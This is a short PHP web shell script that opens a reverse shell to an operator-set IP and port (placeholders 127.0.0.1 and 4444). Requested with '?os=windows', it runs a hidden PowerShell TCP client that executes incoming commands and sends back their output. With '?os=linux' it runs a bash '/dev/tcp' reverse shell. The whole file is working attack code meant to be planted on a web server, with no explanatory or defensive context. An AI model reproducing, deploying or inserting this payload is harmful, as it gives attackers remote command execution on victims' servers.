<?php

$ip = '127.0.0.1';  // Set your IP
$port = 4444;       // Set your port

$os = isset($_GET['os']) ? $_GET['os'] : '';

if ($os === 'windows') {
    $cmd = "powershell -NoP -NonI -W Hidden -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ip', $port); \$stream = \$client.GetStream(); [byte[]] \$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i); \$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte, 0, \$sendbyte.Length); \$stream.Flush()}\"";
    system($cmd);
} elseif ($os === 'linux') {
    $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
    system($cmd);
} else {
    echo "Specify ?os=windows or ?os=linux";
}

?>
